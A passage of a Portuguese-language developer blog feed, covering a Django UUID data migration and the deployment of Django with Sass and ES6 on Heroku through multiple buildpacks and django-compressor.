    &lt;span class="n"&gt;Item&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;apps&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_model&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lista_de_compras&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Item&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uuid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid4&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Usamos o parâmetro &lt;code&gt;apps&lt;/code&gt; para "importar" o modelo. Na sequência, utilizamos o &lt;em&gt;ORM&lt;/em&gt;
para pegar todos os items do banco de dados, iteramos por eles preenchendo o campo
&lt;code&gt;uuid&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Precisamos adicionar essa função ao atributo &lt;code&gt;operations&lt;/code&gt;, da &lt;em&gt;migration&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;dependencies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lista_de_compras&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0002_item_uuid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="n"&gt;operations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RunPython&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gen_uuid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reverse_code&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RunPython&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;noop&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Utilizamos a função &lt;code&gt;RunPython&lt;/code&gt; para executar operações em nossa &lt;em&gt;migration&lt;/em&gt;
que dependem de processamento por parte da linguagem (ou do &lt;em&gt;Django&lt;/em&gt;). Em alguns
cenários, esse tipo de operação não tem um processo de &lt;em&gt;rollback&lt;/em&gt;, portanto,
deixamos explícito que não temos como desfazer a operação através do parâmetro
&lt;code&gt;reverse_code&lt;/code&gt; com valor &lt;code&gt;migrations.RunPython.noop&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;migration&lt;/em&gt; deve ter ficado mais ou menos assim:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;uuid&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;transaction&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;gen_uuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;apps&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;schema_editor&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;Item&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;apps&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_model&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lista_de_compras&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Item&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uuid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid4&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;dependencies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lista_de_compras&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0002_item_uuid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="n"&gt;operations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RunPython&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gen_uuid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reverse_code&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RunPython&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;noop&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ainda não acabou! Uma vez que todos os registros já possuam o seu &lt;code&gt;uuid&lt;/code&gt;
preenchido, precisamos voltar à proposta original do nosso modelo: Com
um campo default, e com preenchimento obrigatório. Para tanto, basta
executar novamente o &lt;code&gt;makemigrations&lt;/code&gt;. Uma nova &lt;em&gt;migration&lt;/em&gt; será criada,
com todas as &lt;em&gt;constraints&lt;/em&gt; definidas corretamente.&lt;/p&gt;
&lt;p&gt;Agora rode o &lt;code&gt;migrate&lt;/code&gt;. Acabamos de criar um campo &lt;code&gt;uuid&lt;/code&gt;,
preenchemos os registros já existentes no &lt;em&gt;database&lt;/em&gt;, e criamos
&lt;em&gt;constraints&lt;/em&gt; para os registros que virão no futuro.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/topics/migrations/"&gt;Django documentation: Migrations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://south.readthedocs.io/en/latest/whataremigrations.html"&gt;South documentation: What are migrations?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="migrations"></category><category term="python"></category><category term="django"></category><category term="south"></category></entry><entry><title>Django, Sass e ES6 no Heroku com Multiple Buildpacks</title><link href="https://klauslaube.com.br/2016/08/27/django-sass-es6-no-heroku-com-multiple-buildpacks.html" rel="alternate"></link><published>2016-08-27T16:00:00-03:00</published><updated>2016-08-27T16:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-08-27:/2016/08/27/django-sass-es6-no-heroku-com-multiple-buildpacks.html</id><summary type="html">&lt;p&gt;Anteriormente, falamos sobre como utilizar o &lt;code&gt;django-compressor&lt;/code&gt; com &lt;a href="https://klauslaube.com.br/tag/sass.html" title="Leia mais sobre Sass"&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://klauslaube.com.br/tag/es6.html" title="Leia mais sobre ES6"&gt;&lt;em&gt;ES6&lt;/em&gt;&lt;/a&gt;. Se você quisesse utilizar o &lt;em&gt;Heroku&lt;/em&gt;,
com uma aplicação &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; executando operações de &lt;em&gt;build&lt;/em&gt;
em &lt;a href="https://klauslaube.com.br/tag/node.html" title="Leia mais sobre Node.JS"&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt;, seria uma tarefa um tanto árdua,
que exigiria um certo nível de paciência na
construção do seu próprio &lt;em&gt;Buildpack&lt;/em&gt;. Hoje, com o …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Anteriormente, falamos sobre como utilizar o &lt;code&gt;django-compressor&lt;/code&gt; com &lt;a href="https://klauslaube.com.br/tag/sass.html" title="Leia mais sobre Sass"&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://klauslaube.com.br/tag/es6.html" title="Leia mais sobre ES6"&gt;&lt;em&gt;ES6&lt;/em&gt;&lt;/a&gt;. Se você quisesse utilizar o &lt;em&gt;Heroku&lt;/em&gt;,
com uma aplicação &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; executando operações de &lt;em&gt;build&lt;/em&gt;
em &lt;a href="https://klauslaube.com.br/tag/node.html" title="Leia mais sobre Node.JS"&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt;, seria uma tarefa um tanto árdua,
que exigiria um certo nível de paciência na
construção do seu próprio &lt;em&gt;Buildpack&lt;/em&gt;. Hoje, com o &lt;em&gt;Multiple Buildpacks&lt;/em&gt;, isso não é mais necessário.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Build o quê?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Buildpack&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;São conjuntos de scripts que, dependendo da linguagem de programação que você escolher,
resolverão dependências, geração de &lt;em&gt;assets&lt;/em&gt; e até mesmo compilação arquivos, dentro da plataforma &lt;em&gt;Heroku&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Ou seja, eles são uma espécie de "provisionamento", onde você escreverá uma série de
instruções que deixarão o ambiente preparado para receber o seu projeto.&lt;/p&gt;
&lt;p&gt;Antigamente, para você trabalhar com compilação/transpilação de &lt;em&gt;assets&lt;/em&gt; em um projeto
&lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Heroku&lt;/em&gt;, você tinha duas opções:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Utilizar (ou construir) um &lt;em&gt;Buildpack&lt;/em&gt; customizado que realizasse o procedimento de instalação das dependências e build (como o &lt;a href="https://github.com/jiaaro/heroku-buildpack-django" title="Veja o repositório no GitHub"&gt;heroku-buildpack-django&lt;/a&gt;);&lt;/li&gt;
&lt;li&gt;"Commitar" os arquivos "buildados" e utilizar o &lt;em&gt;Buildpack Python&lt;/em&gt; padrão.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Eu nunca tive muita paciência com a questão de provisionamento no &lt;em&gt;Heroku&lt;/em&gt;,
então geralmente eu partia para a ignorância e vivia "commitando" &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt; compilados.&lt;/p&gt;
&lt;h2&gt;Repita comigo: Nunca mais vou commitar arquivos compilados&lt;/h2&gt;
&lt;p&gt;É uma péssima ideia! Principalmente quando você está trabalhando em uma equipe grande.
A quantidade de &lt;em&gt;merge hells&lt;/em&gt; envolvendo arquivos compilados é aquele tipo de dor de
cabeça que você deveria evitar desde o princípio.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/multipack-pacific-rim.jpg" width="640" height="360" title="Não dá pra pilotar um Jaeger sozinho (deadline.com)" alt="Não dá pra pilotar um Jaeger sozinho (deadline.com)"&gt;&lt;/p&gt;
&lt;p&gt;De forma bem resumida, vamos ilustrar como funcionaria o fluxo de &lt;em&gt;build&lt;/em&gt; de estáticos com
múltiplos &lt;em&gt;Buildpacks&lt;/em&gt;. Para começar, vamos criar um novo &lt;em&gt;app&lt;/em&gt; no &lt;em&gt;Heroku&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ heroku create
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Caso você tenha dúvidas sobre como criar um projeto &lt;em&gt;Python&lt;/em&gt; no &lt;em&gt;Heroku&lt;/em&gt;,
o "&lt;a href="https://devcenter.heroku.com/articles/getting-started-with-python#introduction" title="Leia documentação oficial"&gt;Getting started&lt;/a&gt;" deles é muito bacana e fácil de seguir.&lt;/p&gt;
&lt;p&gt;Supondo que já instalamos o &lt;em&gt;Django&lt;/em&gt;, e que criamos os arquivos &lt;code&gt;runtime.txt&lt;/code&gt;,
determinando qual a versão do &lt;em&gt;Python&lt;/em&gt; que usaremos, e &lt;code&gt;requirements.txt&lt;/code&gt;,
para resolução de dependências, automaticamente o &lt;em&gt;Heroku&lt;/em&gt; saberá preparar
o ambiente para o nosso projeto.&lt;/p&gt;
&lt;p&gt;Mas caso você queira ter certeza disso, podemos usar o comando &lt;code&gt;buildpacks:set&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ heroku buildpacks:set heroku/python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como no &lt;a href="https://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html" title="Django e Sass com django-compressor"&gt;&lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;,
utilizaremos a biblioteca &lt;em&gt;Python&lt;/em&gt; &lt;code&gt;libsass&lt;/code&gt;. Logo, vamos adicioná-la ao &lt;code&gt;requirements.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;Django&lt;/span&gt;
&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;compressor&lt;/span&gt;
&lt;span class="n"&gt;libsass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não podemos deixar de configurar o &lt;code&gt;django-compressor&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;

&lt;span class="n"&gt;COMPRESS_PRECOMPILERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/x-sass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sassc {infile} {outfile}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mas e o &lt;em&gt;ES6&lt;/em&gt;? Precisaremos do &lt;a href="https://klauslaube.com.br/tag/babel.html" title="Leia mais sobre BabelJS"&gt;BabelJS&lt;/a&gt;,
e consequentemente do &lt;em&gt;Node.js&lt;/em&gt;, para realizar o &lt;em&gt;transpiling&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Python + Node.js em uma mesma instância Heroku&lt;/h2&gt;
&lt;p&gt;Para adicionar um novo &lt;em&gt;Buildpack&lt;/em&gt;, temos o seguinte comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ heroku buildpacks:add --index &lt;span class="m"&gt;1&lt;/span&gt; heroku/nodejs
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Onde &lt;code&gt;--index&lt;/code&gt; determina qual será a ordem de execução do &lt;em&gt;Buildpack&lt;/em&gt;.
Nesse caso, opto por ele ser o primeiro e o do &lt;em&gt;Python&lt;/em&gt; segundo,
somente para garantir que todas as dependências estejam sanadas quando
a resolução de estáticos do &lt;em&gt;Django&lt;/em&gt; acontecer.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Buildpack Python&lt;/em&gt; executa operações dependendo de alguns arquivos
do nosso projeto. Por exemplo, como mencionado acima, precisamos especificar
a versão da linguagem (&lt;code&gt;runtime.txt&lt;/code&gt;), instalar as dependências do projeto
(&lt;code&gt;requirements.txt&lt;/code&gt;) e no caso do &lt;em&gt;Django&lt;/em&gt;, executar a operação de
&lt;code&gt;collectstatic&lt;/code&gt; após o deploy (&lt;code&gt;manage.py&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;No caso do &lt;em&gt;Node.js&lt;/em&gt;, precisaremos ter um arquivo &lt;code&gt;package.json&lt;/code&gt; na raíz do
projeto, contendo todas as bibliotecas que o projeto usa, para essa linguagem:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ npm init .
$ npm install --save babelify babel-preset-es2015
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não podemos esquecer do &lt;code&gt;.babelrc&lt;/code&gt;, essencial para a execução do &lt;em&gt;Babel&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// .babelrc&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;presets&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es2015&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E por fim, falta adicionar o pré-compilador ao &lt;code&gt;django-compressor&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;

&lt;span class="n"&gt;COMPRESS_PRECOMPILERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/x-sass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sassc {infile} {outfile}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/es6&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;./node_modules/.bin/browserify {infile} -t babelify --outfile {outfile}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Ao dar o &lt;code&gt;git push heroku master&lt;/code&gt;, a plataforma executará primeiro o
&lt;em&gt;Buildback Node.js&lt;/em&gt;, e na sequência o &lt;em&gt;Buildpack Python&lt;/em&gt;. No momento de entrega das
páginas, teremos os binários &lt;code&gt;browserify&lt;/code&gt; e &lt;code&gt;sassc&lt;/code&gt; instalados em nossa instância,
e poderemos entregar nossas páginas com &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt; compilados sem a necessidade de "commitá-los".&lt;/p&gt;
&lt;h2&gt;Comprimindo no momento do deploy&lt;/h2&gt;
&lt;p&gt;Comprimir/compilar &lt;em&gt;assets&lt;/em&gt; no momento da requisição também é algo que deve ser evitado.
Embora o &lt;em&gt;Django Compressor&lt;/em&gt; faça um excelente trabalho nesse quesito, se estivermos usando
uma &lt;em&gt;CDN&lt;/em&gt; para a entrega desses estáticos, esse procedimento não deve acontecer durante a requisição de um usuário.&lt;/p&gt;
&lt;p&gt;Para executar o comando &lt;code&gt;compress&lt;/code&gt; da biblioteca &lt;code&gt;django-compressor&lt;/code&gt; em tempo de &lt;em&gt;deploy&lt;/em&gt;,
basta fazermos duas coisas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Garantir que &lt;code&gt;COMPRESS_OFFLINE&lt;/code&gt;, na configuração do seu projeto, esteja setado como &lt;code&gt;True&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Criar um diretório &lt;code&gt;bin&lt;/code&gt;, e dentro dele um arquivo &lt;code&gt;post_compile&lt;/code&gt;, com a instrução de &lt;code&gt;compress&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env bash&lt;/span&gt;

python manage.py compress
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Feito! Agora a cada &lt;em&gt;deploy&lt;/em&gt; da sua aplicação, o &lt;em&gt;build&lt;/em&gt; dos &lt;em&gt;assets&lt;/em&gt; acontecerá
automaticamente, dispensando assim a necessidade de ficar enviando &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt; "buildados"
através de &lt;code&gt;git push&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Dúvidas sobre a relação entre Django, Sass e ES6? Eu a detalho um pouco melhor nesses dois posts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2016/06/20/django-e-es6-com-django-compressor.html"&gt;Django e ES6 com django-compressor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html"&gt;Django e Sass com django-compressor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://devcenter.heroku.com/articles/using-multiple-buildpacks-for-an-app"&gt;Heroku Dev Center: Using Multiple Buildpacks for an App&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category><category term="sass"></category><category term="es6"></category><category term="css"></category><category term="js"></category><category term="heroku"></category><category term="buildpack"></category></entry><entry><title>Django e ES6 com django-compressor</title><link href="https://klauslaube.com.br/2016/06/20/django-e-es6-com-django-compressor.html" rel="alternate"></link><published>2016-06-20T23:04:00-03:00</published><updated>2016-06-20T23:04:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-06-20:/2016/06/20/django-e-es6-com-django-compressor.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html" title="Django e Sass com django-compressor"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
falamos sobre como utilizar o &lt;a href="https://klauslaube.com.br/tag/sass.html" title="Leia mais sobre Sass"&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
com o &lt;em&gt;framework&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;
através da biblioteca &lt;em&gt;Compressor&lt;/em&gt; (e sem necessitar de uma
ferramenta intermediária para &lt;em&gt;build&lt;/em&gt;). Nesse artigo, vamos utilizar
o mesmo conceito e apresentar uma forma diferente de utilizar
a nova versão do &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;
com o &lt;code&gt;django-compressor&lt;/code&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Instalando e …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html" title="Django e Sass com django-compressor"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
falamos sobre como utilizar o &lt;a href="https://klauslaube.com.br/tag/sass.html" title="Leia mais sobre Sass"&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
com o &lt;em&gt;framework&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;
através da biblioteca &lt;em&gt;Compressor&lt;/em&gt; (e sem necessitar de uma
ferramenta intermediária para &lt;em&gt;build&lt;/em&gt;). Nesse artigo, vamos utilizar
o mesmo conceito e apresentar uma forma diferente de utilizar
a nova versão do &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;
com o &lt;code&gt;django-compressor&lt;/code&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Instalando e configurando o Compressor&lt;/h2&gt;
